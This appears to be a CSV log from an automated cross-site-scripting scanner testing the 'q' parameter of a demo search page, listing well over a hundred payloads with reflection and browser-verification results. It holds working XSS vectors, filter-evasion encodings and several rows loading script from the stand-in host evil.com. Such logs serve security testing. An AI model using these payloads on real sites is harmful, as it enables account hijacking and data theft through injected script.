Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:55:42.857,2026-01-10 16:55:42.938,0.080,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:55:42.938,2026-01-10 16:55:43.064,0.126,https://demo-knsl.onrender.com/search,GET,q,<button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.064,2026-01-10 16:55:43.181,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.181,2026-01-10 16:55:43.310,0.129,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><button>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.310,2026-01-10 16:55:43.442,0.133,https://demo-knsl.onrender.com/search,GET,q,<video poster=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.442,2026-01-10 16:55:43.544,0.101,https://demo-knsl.onrender.com/search,GET,q,<html manifest=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.544,2026-01-10 16:55:43.657,0.113,https://demo-knsl.onrender.com/search,GET,q,<html xmlns:xss><xss:script>alert(1)</xss:script></html>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.657,2026-01-10 16:55:43.774,0.117,https://demo-knsl.onrender.com/search,GET,q,<img lowsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.774,2026-01-10 16:55:43.898,0.124,https://demo-knsl.onrender.com/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:43.898,2026-01-10 16:55:44.027,0.129,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.027,2026-01-10 16:55:44.137,0.110,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.137,2026-01-10 16:55:44.297,0.160,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.297,2026-01-10 16:55:44.417,0.120,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.417,2026-01-10 16:55:44.540,0.122,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.540,2026-01-10 16:55:44.658,0.118,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.658,2026-01-10 16:55:44.767,0.110,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.767,2026-01-10 16:55:44.890,0.122,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.890,2026-01-10 16:55:44.988,0.098,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:44.988,2026-01-10 16:55:45.097,0.109,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.097,2026-01-10 16:55:45.215,0.118,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.215,2026-01-10 16:55:45.346,0.131,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.346,2026-01-10 16:55:45.472,0.126,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.472,2026-01-10 16:55:45.577,0.105,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.577,2026-01-10 16:55:45.697,0.120,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.697,2026-01-10 16:55:45.818,0.121,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.818,2026-01-10 16:55:45.946,0.129,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:45.946,2026-01-10 16:55:46.105,0.159,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.105,2026-01-10 16:55:46.217,0.112,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.217,2026-01-10 16:55:46.338,0.120,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.338,2026-01-10 16:55:46.457,0.119,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.457,2026-01-10 16:55:46.580,0.123,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.581,2026-01-10 16:55:46.696,0.115,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.696,2026-01-10 16:55:46.816,0.120,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.816,2026-01-10 16:55:46.938,0.123,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:46.938,2026-01-10 16:55:47.057,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.057,2026-01-10 16:55:47.197,0.140,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.197,2026-01-10 16:55:47.333,0.137,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.333,2026-01-10 16:55:47.442,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.442,2026-01-10 16:55:47.563,0.122,https://demo-knsl.onrender.com/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.563,2026-01-10 16:55:47.659,0.096,https://demo-knsl.onrender.com/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.659,2026-01-10 16:55:47.777,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.777,2026-01-10 16:55:47.906,0.129,https://demo-knsl.onrender.com/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:47.906,2026-01-10 16:55:48.013,0.107,https://demo-knsl.onrender.com/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.013,2026-01-10 16:55:48.126,0.112,https://demo-knsl.onrender.com/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.126,2026-01-10 16:55:48.214,0.088,https://demo-knsl.onrender.com/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
2026-01-10 16:55:48.214,2026-01-10 16:55:48.347,0.133,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.347,2026-01-10 16:55:48.468,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.468,2026-01-10 16:55:48.581,0.113,https://demo-knsl.onrender.com/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.581,2026-01-10 16:55:48.697,0.117,https://demo-knsl.onrender.com/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.697,2026-01-10 16:55:48.818,0.120,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.818,2026-01-10 16:55:48.951,0.133,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:48.951,2026-01-10 16:55:49.074,0.123,https://demo-knsl.onrender.com/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.074,2026-01-10 16:55:49.180,0.106,https://demo-knsl.onrender.com/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.180,2026-01-10 16:55:49.296,0.117,https://demo-knsl.onrender.com/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.297,2026-01-10 16:55:49.417,0.121,https://demo-knsl.onrender.com/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.417,2026-01-10 16:55:49.537,0.120,https://demo-knsl.onrender.com/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.537,2026-01-10 16:55:49.659,0.122,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.659,2026-01-10 16:55:49.790,0.131,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.790,2026-01-10 16:55:49.899,0.109,https://demo-knsl.onrender.com/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:49.899,2026-01-10 16:55:50.016,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.016,2026-01-10 16:55:50.139,0.122,https://demo-knsl.onrender.com/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.139,2026-01-10 16:55:50.259,0.121,https://demo-knsl.onrender.com/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.259,2026-01-10 16:55:50.380,0.121,https://demo-knsl.onrender.com/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.380,2026-01-10 16:55:50.498,0.118,https://demo-knsl.onrender.com/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.498,2026-01-10 16:55:50.616,0.118,https://demo-knsl.onrender.com/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.616,2026-01-10 16:55:50.738,0.121,https://demo-knsl.onrender.com/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.738,2026-01-10 16:55:50.879,0.141,https://demo-knsl.onrender.com/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:50.879,2026-01-10 16:55:51.025,0.147,https://demo-knsl.onrender.com/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.025,2026-01-10 16:55:51.152,0.126,https://demo-knsl.onrender.com/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.152,2026-01-10 16:55:51.215,0.063,https://demo-knsl.onrender.com/search,GET,q,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-10 16:55:51.215,2026-01-10 16:55:51.337,0.122,https://demo-knsl.onrender.com/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.337,2026-01-10 16:55:51.456,0.119,https://demo-knsl.onrender.com/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.456,2026-01-10 16:55:51.582,0.126,https://demo-knsl.onrender.com/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.582,2026-01-10 16:55:51.655,0.072,https://demo-knsl.onrender.com/search,GET,q,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-10 16:55:51.655,2026-01-10 16:55:51.755,0.100,https://demo-knsl.onrender.com/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.755,2026-01-10 16:55:51.872,0.117,https://demo-knsl.onrender.com/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.872,2026-01-10 16:55:51.978,0.107,https://demo-knsl.onrender.com/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:51.978,2026-01-10 16:55:52.062,0.084,https://demo-knsl.onrender.com/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
2026-01-10 16:55:52.062,2026-01-10 16:55:52.177,0.115,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.177,2026-01-10 16:55:52.313,0.136,https://demo-knsl.onrender.com/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.313,2026-01-10 16:55:52.425,0.112,https://demo-knsl.onrender.com/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.425,2026-01-10 16:55:52.538,0.113,https://demo-knsl.onrender.com/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.538,2026-01-10 16:55:52.677,0.139,https://demo-knsl.onrender.com/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.677,2026-01-10 16:55:52.776,0.099,https://demo-knsl.onrender.com/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:52.776,2026-01-10 16:55:52.854,0.077,https://demo-knsl.onrender.com/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:55:52.854,2026-01-10 16:55:52.934,0.080,https://demo-knsl.onrender.com/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
2026-01-10 16:55:52.934,2026-01-10 16:55:53.057,0.123,https://demo-knsl.onrender.com/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.057,2026-01-10 16:55:53.177,0.120,https://demo-knsl.onrender.com/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.177,2026-01-10 16:55:53.297,0.120,https://demo-knsl.onrender.com/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.297,2026-01-10 16:55:53.417,0.119,https://demo-knsl.onrender.com/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.417,2026-01-10 16:55:53.556,0.139,https://demo-knsl.onrender.com/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.556,2026-01-10 16:55:53.697,0.141,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.697,2026-01-10 16:55:53.816,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.816,2026-01-10 16:55:53.937,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:53.937,2026-01-10 16:55:54.053,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.053,2026-01-10 16:55:54.176,0.123,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.176,2026-01-10 16:55:54.286,0.110,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.286,2026-01-10 16:55:54.394,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.394,2026-01-10 16:55:54.537,0.143,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.537,2026-01-10 16:55:54.656,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.656,2026-01-10 16:55:54.778,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.778,2026-01-10 16:55:54.898,0.120,https://demo-knsl.onrender.com/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:54.898,2026-01-10 16:55:55.017,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.017,2026-01-10 16:55:55.142,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.142,2026-01-10 16:55:55.264,0.122,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.264,2026-01-10 16:55:55.377,0.113,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.377,2026-01-10 16:55:55.538,0.161,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.538,2026-01-10 16:55:55.657,0.119,https://demo-knsl.onrender.com/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.657,2026-01-10 16:55:55.778,0.121,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.778,2026-01-10 16:55:55.910,0.132,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:55.910,2026-01-10 16:55:56.025,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.025,2026-01-10 16:55:56.157,0.132,https://demo-knsl.onrender.com/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.157,2026-01-10 16:55:56.306,0.148,https://demo-knsl.onrender.com/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.306,2026-01-10 16:55:56.417,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.417,2026-01-10 16:55:56.537,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.537,2026-01-10 16:55:56.694,0.157,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.694,2026-01-10 16:55:56.817,0.123,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.817,2026-01-10 16:55:56.937,0.119,https://demo-knsl.onrender.com/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:56.937,2026-01-10 16:55:56.992,0.055,https://demo-knsl.onrender.com/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
2026-01-10 16:55:56.992,2026-01-10 16:55:57.106,0.114,https://demo-knsl.onrender.com/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.106,2026-01-10 16:55:57.230,0.124,https://demo-knsl.onrender.com/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.230,2026-01-10 16:55:57.344,0.114,https://demo-knsl.onrender.com/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.344,2026-01-10 16:55:57.423,0.079,https://demo-knsl.onrender.com/search,GET,q,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
2026-01-10 16:55:57.423,2026-01-10 16:55:57.576,0.153,https://demo-knsl.onrender.com/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.576,2026-01-10 16:55:57.697,0.120,https://demo-knsl.onrender.com/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.697,2026-01-10 16:55:57.817,0.120,https://demo-knsl.onrender.com/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.817,2026-01-10 16:55:57.915,0.099,https://demo-knsl.onrender.com/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:57.915,2026-01-10 16:55:58.025,0.110,https://demo-knsl.onrender.com/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.025,2026-01-10 16:55:58.137,0.112,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.137,2026-01-10 16:55:58.257,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.257,2026-01-10 16:55:58.377,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.377,2026-01-10 16:55:58.496,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.496,2026-01-10 16:55:58.619,0.122,https://demo-knsl.onrender.com/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.619,2026-01-10 16:55:58.740,0.121,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.740,2026-01-10 16:55:58.857,0.117,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.857,2026-01-10 16:55:58.984,0.127,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:58.984,2026-01-10 16:55:59.114,0.131,https://demo-knsl.onrender.com/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:59.114,2026-01-10 16:55:59.226,0.111,https://demo-knsl.onrender.com/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:55:59.226,2026-01-10 16:55:59.344,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,Yes,alert,Critical
